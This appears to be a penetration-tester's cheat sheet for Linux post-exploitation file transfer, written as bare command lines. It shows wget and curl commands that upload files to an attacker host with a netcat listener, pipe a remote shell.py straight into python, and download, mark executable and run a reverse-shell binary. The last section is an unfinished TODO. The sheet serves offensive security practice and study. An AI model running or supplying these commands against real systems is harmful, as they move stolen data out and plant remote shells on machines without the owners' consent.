# Living off the Land

Search Tag(s): #post-exploitation #file-transfer-and-data-exfiltration #living-off-the-land #linux

## 01 - Download

### 1.1 - `wget`

```
$ wget -O rsh.php http://<IP>:<PORT>/shell.php

$ wget --no-check-certificate https://<IP>/file.tar.gz
```

Resume partially downloaded file.

```
$ wget -c http://<IP>/file.tar.gz
```

Download multiple files with different URLs from a text file list.

```
$ wget -i download-files-urls.txt
```

### 1.2 - cURL

```
$ curl -O -C - http://<IP>:<PORT>/shell.php

$ curl -o rsh.php http://<IP>:<PORT>/shell.php

$ curl -o downloaded.tar.gz http[s]://<IP>/file.tar.gz
```

Interact with http proxy server tunnel.

```
$ curl -p -x http://<proxy_IP> http://website.com
```

### 1.3 - `aria2c`

```
$ aria2c http://<IP>/file.tar.gz
```

## 02 - Upload

### 2.1 - `wget`

```
$ wget --post-file=file.txt <attacker_IP>

$ sudo nc -lnvp 80
```

### 2.2 - cURL

```
$ curl -T /path/to/file.txt http[s]://<IP>
```

Upload file via POST request form.

```
$ curl -F file=@/path/to/file.txt http[s]://<IP>/post
```

Upload file via POST HTTP request.

```
$ curl -X POST -d @/path/to/file.txt <IP>

$ sudo nc -lnvp 80 > file.txt
```

## 03 - Callback Implant

### 3.1 - Fileless execution

```
$ curl http[s]://<IP>/shell.py | python
```

If the machine doesn't have `curl` installed you can use `wget` to execute it through memory.

```
$ wget -qO- http[s]://<IP>/shell.py | python
```

### 3.2 - Dropping on disk

Download reverse shell binary and execute it.

```
$ curl -o shell.elf http[s]://<IP>/shell.elf && chmod +x shell.elf && ./shell.elf

$ wget -O shell.elf http[s]://<IP>/shell.elf && chmod +x shell.elf && ./shell.elf
```

### 3.3 - Compiled After Delivery

TODO: Fill this info

```
$ gcc
```